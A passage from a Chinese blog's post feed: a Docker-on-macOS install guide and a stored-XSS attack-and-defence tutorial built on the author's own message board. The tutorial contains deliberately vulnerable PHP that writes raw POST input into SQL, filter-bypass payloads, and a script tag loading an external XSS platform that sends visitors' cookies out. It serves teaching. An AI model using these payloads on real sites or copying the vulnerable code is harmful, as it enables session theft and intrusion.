alt="image-20220615171540021" style="zoom:33%;" /><p>4.进入docker直接跳转即可</p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220615pkIXlS.png" alt="image-20220615171952695" style="zoom:33%;" /><ol start="5"><li>本地部署成功</li></ol><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/2022061548uTa4.png" alt="image-20220615172120211" style="zoom:33%;" /><h2 id="部署成功直接开干，渗透测试的靶场拿来练习"><a href="#部署成功直接开干，渗透测试的靶场拿来练习" class="headerlink" title="部署成功直接开干，渗透测试的靶场拿来练习"></a>部署成功直接开干，渗透测试的靶场拿来练习</h2><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 软件测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker(mac)的安装</title>
      <link href="/2022/06/15/%E5%AE%89%E8%A3%85_Docker%EF%BC%88macOS%EF%BC%89/"/>
      <url>/2022/06/15/%E5%AE%89%E8%A3%85_Docker%EF%BC%88macOS%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>本文简单介绍介绍如何在 macOS 系统下安装 Docker</p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>安装 Docker 时，macOS 系统最低要求为 Mojave 10.14。详情请访问 <a href="https://docs.docker.com/docker-for-mac/">Docker Desktop for Mac</a>。</p><h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><h3 id="方式一：使用-Homebrew-安装"><a href="#方式一：使用-Homebrew-安装" class="headerlink" title="方式一：使用 Homebrew 安装"></a>方式一：使用 Homebrew 安装</h3><p><a href="https://brew.sh/">Homebrew</a> 的 <a href="https://github.com/Homebrew/homebrew-cask">Cask</a> 已经支持 Docker Desktop for Mac。因此，您可以很方便的使用 Homebrew Cask 来安装 Docker：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install --cask docker</span><br></pre></td></tr></table></figure><h3 id="方式二：手动下载安装"><a href="#方式二：手动下载安装" class="headerlink" title="方式二：手动下载安装"></a>方式二：手动下载安装</h3><p>如果您需要手动下载，请下载 Docker 官网的 <a href="https://desktop.docker.com/mac/stable/Docker.dmg">Docker.dmg</a> 文件，文件大约 500 MB。</p><p>如同 macOS 其它软件一样，安装也非常简单，双击下载的 <code>.dmg</code> 文件，然后将 <a href="https://www.docker.com/blog/call-me-moby-dock/">Moby</a> 的鲸鱼图标拖拽到 <code>Application</code> 文件夹即可。</p><p><img src="https://airtake-public-data-1254153901.cos.ap-shanghai.myqcloud.com/goat/20210326/04fac8178ce743ca80ae100fbd463a99.png"></p><h2 id="运行-Docker-中的服务"><a href="#运行-Docker-中的服务" class="headerlink" title="运行 Docker 中的服务"></a>运行 Docker 中的服务</h2><ol><li>从您的桌面应用中找到 Docker 图标并点击运行。</li><li>运行之后，会在右上角菜单栏看到多了一个 Moby 鲸鱼图标，这个图标表明了 Docker 的运行状态。</li><li>每次点击鲸鱼图标会弹出操作菜单。</li><li>之后，您可以在终端通过命令检查安装后的 Docker 版本。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker --version</span><br><span class="line">Docker version 20.10.0, build 7287ab3</span><br></pre></td></tr></table></figure></li><li>（可选）如果 <code>docker version</code>、<code>docker info</code> 都正常的话，可以尝试运行一个 <a href="https://hub.docker.com/_/nginx/">Nginx 服务器</a>。<ol><li>运行以下命令运行 Nginx 服务。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d -p 80:80 --name webserver nginx</span><br></pre></td></tr></table></figure></li><li>服务运行后，访问 <a href="http://localhost/">http://localhost</a>，如果看到了 “Welcome to nginx!”，就说明 Docker Desktop for Mac 安装成功了。</li><li>要停止 Nginx 服务器并删除执行下面的命令： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop webserver</span><br><span class="line">$ docker rm webserver</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="镜像加速"><a href="#镜像加速" class="headerlink" title="镜像加速"></a>镜像加速</h2><p>如果您在使用过程中发现拉取 Docker 镜像十分缓慢，可以配置 <a href="https://developer.tuya.com/cn/docs/iot/device-development/edge-computing/docker-install/mirror?id=Kag5inkdpb60w">Docker 国内镜像加速</a>。</p><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>存储型xss的攻防</title>
      <link href="/2022/06/15/%E5%AD%98%E5%82%A8%E5%9E%8B_XSS_%E7%9A%84%E6%94%BB%E9%98%B2/"/>
      <url>/2022/06/15/%E5%AD%98%E5%82%A8%E5%9E%8B_XSS_%E7%9A%84%E6%94%BB%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>存储型 XSS 是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击的目的，一般是注入一段 javascript 脚本。</p></blockquote><blockquote><p>不想做开发的黑客不是好黑客。  </p></blockquote><p><strong>本文只对存储型 XSS 进行分析。那么，什么是存储型 XSS 呢？</strong></p><p>它是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击的目的，一般是注入一段 javascript 脚本。在测试过程中，我们一般是使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过这段 js 代码，弹个框来证明存在 xss 漏洞。那么，可能新手就会问了，弹个框有什么用呢？</p><p>其实，弹框只是为了证明存在此漏洞。而此漏洞的利用方式由很多种。</p><p>比如，你可以使用 xss 平台：</p><p><img src="https://image.3001.net/images/20191016/1571237076_5da72cd4743b3.png!small">写入一段平台生成的 xss 脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//xsspt.com/ZsgUBf&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当某人进入带有这个脚本的页面时，js 脚本会获取他的 cookie 并发往 xss 平台。</p><p>你只需要登录 xss 平台等待即可，拿到 cookie 后，可以不需要密码登录他的账号。</p><p><strong>注意：本文的重点是一步一步以黑客的角度进行 xss 攻击，再讨论如何站在开发者的角度去一步一步防御 xss 攻击。所以我会在本文中以开发的身份修正后端代码，再以黑客的身份进行前端页面的 xss 攻击，这一点需要注意哦。</strong></p><p>对于存储型 xss 漏洞的表现形式，比较经典的是留言板。但是我们都是遵纪守法的好同学，不能对外面的网站进行测试，所以就花半个小时自己手撸一个留言板咯。</p><p>首先，应该有前端展示的页面 Message_Board.php 和后端存储数据的页面 addMessage.php</p><p><img src="https://image.3001.net/images/20191030/1572434179_5db9710329b9a.png!small"></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg=="></p><p>前端代码不是本文重点（感兴趣的可以去看看代码：<a href="https://github.com/BrucessKING/Back-stage-Management">https://github.com/BrucessKING/Back-stage-Management</a>）</p><p>我们重点关注后端代码 addMessage.php：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$nickname = @$_POST[&#x27;nickname&#x27;];//昵称</span><br><span class="line">$email = @$_POST[&#x27;email&#x27;];//邮箱</span><br><span class="line">$content = @$_POST[&#x27;content&#x27;];//留言内容</span><br><span class="line">$now_time = @$_POST[&#x27;now_time&#x27;];//留言时间</span><br><span class="line">$ini= @parse_ini_file(&quot;config.ini&quot;);</span><br><span class="line">    $con = @mysql_connect($ini[&quot;servername&quot;],$ini[&quot;username&quot;],$ini[&quot;password&quot;]);</span><br><span class="line">if($con)&#123;</span><br><span class="line">mysql_query(&quot;set names &#x27;utf8&#x27;&quot;);//解决中文乱码问题</span><br><span class="line">mysql_select_db($ini[&quot;dbname&quot;]);</span><br><span class="line">$sql1 = &quot;select count(*) from message_board&quot;;</span><br><span class="line">$result = mysql_query($sql1);</span><br><span class="line">$floor = mysql_fetch_row($result)[0] + 1;</span><br><span class="line">$sql = &quot;insert into message_board values($floor,\&quot;$nickname\&quot;,\&quot;$email\&quot;,\&quot;$content\&quot;,\&quot;$now_time\&quot;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，我们对传入的四个参数完全没有处理，而是直接存入数据库中。</p><p>所以，只要我们这样输入：</p><p><img src="https://image.3001.net/images/20191030/1572434205_5db9711d699e9.png!small"></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==">提交之后，系统会自动刷新页面出现弹框：</p><p><img src="https://image.3001.net/images/20191030/1572434238_5db9713e4f4de.png!small"></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==">点击确定后，你会发现留言内容和留言者的部分都为空。</p><p><img src="https://image.3001.net/images/20191030/1572434262_5db971569ae9e.png!small"></p><p>这是因为 js 脚本已经被解析了，这时我们按 F12，打开浏览器的开发者工具，发现了 js 脚本。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg=="><img src="https://image.3001.net/images/20191030/1572434290_5db9717202dd0.png!small"></p><p>那么，问题来了。</p><p>毕竟我们还有另外一个身份，开发者该如何防御呢？</p><h2 id="0x00、来个最简单的，只修改前端代码"><a href="#0x00、来个最简单的，只修改前端代码" class="headerlink" title="0x00、来个最简单的，只修改前端代码"></a><strong>0x00、来个最简单的，只修改前端代码</strong></h2><p>在 input 标签里面加上 maxlength 属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; &gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>至于原理嘛，就是因为 js 脚本的形式为 <script></script > 长度为 17，所以只要我们在前端对长度进行限制，就可以阻止黑客进行 xss 攻击了</p><p><strong>可是！开发可没这么好做！</strong></p><p>我们是想做开发的黑客，所以还得自己搞自己。</p><p>作为攻击者，我们同样可以修改前端代码，具体的操作是使用浏览器的 F12（开发者工具）</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg=="><img src="https://image.3001.net/images/20191030/1572434318_5db9718e69775.png!small"></p><p>可以看到，我们可以直接进行长度的修改。</p><p>另外，还可以用抓包的方法，在包里面直接写，也是不受长度限制的。</p><h2 id="0x01、对关键字-script-进行过滤"><a href="#0x01、对关键字-script-进行过滤" class="headerlink" title="0x01、对关键字 script 进行过滤"></a><strong>0x01、对关键字 script 进行过滤</strong></h2><p>作为开发者，你很容易发现，要想进行 xss 攻击，必须插入一段 js 脚本，而 js 脚本的特征是很明显的，脚本中包含 script 关键字，那么我们只需要进行 script 过滤即可。</p><p>回到之前的代码。</p><p>为方便说明，我只取 nickname 参数，其实传入的四个参数需要做同样的处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$nickname = str_replace(&quot;script&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这个 str_replace() 函数的意思是把 script 替换为空。</p><p>可以看到，script 被替换为空，弹框失败。</p><p><img src="https://image.3001.net/images/20191030/1572434352_5db971b06f416.png!small"></p><p>那么黑客该如何继续进行攻击呢？</p><p><strong>答案是：大小写绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCrIPt&gt;alert(1)&lt;/ScripT&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg=="><img src="https://image.3001.net/images/20191030/1572434377_5db971c9ef422.png!small"></p><p>因为 js 是<strong>不区分大小写</strong>的，所以我们的大小写不影响脚本的执行</p><p><strong>成功弹框</strong></p><h2 id="0x02、使用-str-ireplace-函数进行不区分大小写地过滤-script-关键字"><a href="#0x02、使用-str-ireplace-函数进行不区分大小写地过滤-script-关键字" class="headerlink" title="****0x02、使用 str_ireplace() 函数进行不区分大小写地过滤 script 关键字"></a>**<img src="https://image.3001.net/images/20191030/1572434395_5db971db951b0.png!small"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg=="><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==">**<strong>0x02、使用 str_ireplace() 函数进行不区分大小写地过滤 script 关键字</strong></h2><p>作为一名优秀的开发，发现了问题当然要及时改正，不区分大小写不就行了嘛</p><p>后端代码修正如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$nickname = str_ireplace(&quot;script&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>str_ireplace() 函数类似于上面的 str_replace（），但是它不区分大小写。</p><p>那么，大黑阔该如何绕过？</p><p><strong>答案是：双写 script</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Sscriptcript&gt;alert(1)&lt;/Sscriptcript&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg=="><img src="https://image.3001.net/images/20191030/1572434426_5db971fa060fe.png!small"></p><p>原理就是 str_ireplace() 函数只找出了中间的 script 关键字，前面的 S 和后面的 cript 组合在一起，构成了新的 Script 